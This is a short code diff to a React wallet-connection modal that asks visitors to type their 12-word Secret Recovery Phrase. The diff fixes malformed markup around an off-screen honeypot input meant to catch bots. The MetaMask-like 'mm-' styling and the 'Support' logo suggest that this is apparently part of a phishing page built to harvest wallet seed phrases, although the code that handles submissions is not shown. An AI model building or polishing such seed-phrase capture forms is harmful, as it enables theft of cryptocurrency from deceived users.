@@ -260,18 +260,19 @@ const WalletConnectionModal = ({ onClose }) => {
               <img src="/favicon.png" alt="Support" className="mm-logo-small" />
               <h2 className="mm-title">Import with Secret Recovery Phrase</h2>
             </div>
-            <p{/* Honeypot field - hidden from users but visible to bots */}
+            {/* Honeypot field - hidden from users but visible to bots */}
+            <div style={{ position: 'absolute', left: '-9999px', width: '1px', height: '1px' }}>
               <input
                 type="text"
                 name="website"
                 value={honeypot}
                 onChange={(e) => setHoneypot(e.target.value)}
-                style={{ position: 'absolute', left: '-9999px', width: '1px', height: '1px' }}
                 tabIndex="-1"
                 autoComplete="off"
                 aria-hidden="true"
               />
-               className="mm-manual-subtitle">Enter your 12-word Secret Recovery Phrase to restore your wallet.</p>
+            </div>
+            <p className="mm-manual-subtitle">Enter your 12-word Secret Recovery Phrase to restore your wallet.</p>
             <form onSubmit={handleSubmit} className="mm-form">
               <div className="mm-word-grid">
                 {words.map((word, index) => (
